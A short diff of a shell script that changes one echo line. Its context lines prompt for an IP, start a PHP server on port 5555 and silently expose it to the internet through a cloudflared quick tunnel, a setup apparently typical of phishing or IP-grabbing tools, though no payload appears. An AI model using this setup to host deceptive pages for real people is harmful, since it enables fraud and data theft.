@@ -17,7 +17,7 @@ echo -en "${IYellow}ENTER IP: ${Yellow}"
 read ips
 php -S 0.0.0.0:5555 > /dev/null 2>&1 &
 $HOME/cloudflared tunnel -url localhost:5555 --logfile $HOME/.cf.log > /dev/null 2>&1 &
-echo "${Green}PLEASE WAIT...${clear}"
+echo -e "${Green}PLEASE WAIT...${clear}"
 sleep 7
 cdf=$(cat $HOME/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
 sleep 3
